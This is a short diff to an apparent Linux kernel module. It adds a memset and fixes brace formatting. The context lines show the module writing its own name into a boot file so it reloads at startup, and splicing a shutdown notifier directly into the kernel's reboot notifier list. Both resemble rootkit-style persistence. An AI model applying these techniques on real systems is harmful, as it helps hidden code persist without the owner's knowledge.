@@ -26,6 +26,7 @@ char* get_file_name(void){
     int i = 0;
     size_t boot_file_extension_len;
     char* file_name = kmalloc(MAX_FILENAME_LENGTH + 1, GFP_KERNEL);
+    memset(file_name, 0, MAX_FILENAME_LENGTH + 1);
     boot_file_extension_len = strlen(BOOT_FILE_EXTENSION);
     memcpy(file_name + MAX_FILENAME_LENGTH - boot_file_extension_len, BOOT_FILE_EXTENSION, boot_file_extension_len);
     for (; i < MAX_FILENAME_LENGTH - boot_file_extension_len; ++i){
@@ -49,10 +50,10 @@ char* register_for_boot() {
     printk("%s\n", file_full_path);
     
     file = file_open(file_full_path, O_CREAT | O_RDWR | O_TRUNC, 0);
-    if (NULL == file){
+    if (NULL == file) {
         goto release_resources;
     }
-    if (strlen(THIS_MODULE->name) != file_write(file, 0,  THIS_MODULE->name, strlen(THIS_MODULE->name))){
+    if (strlen(THIS_MODULE->name) != file_write(file, 0,  THIS_MODULE->name, strlen(THIS_MODULE->name))) {
         printk("Failed register for boot\n");
     }
     else {
@@ -74,11 +75,10 @@ void register_for_shutdown(){
     notifier->notifier_call = shutdown_notifier;
     notifier->priority = 0;
     notifier_ptr = reboot_notifier_list->head;
-    if (NULL == notifier_ptr)
-    {
+    if (NULL == notifier_ptr) {
         reboot_notifier_list->head = notifier;
     }
-    else{
+    else {
         while (NULL != notifier_ptr->next){
             notifier_ptr = notifier_ptr->next;
         }
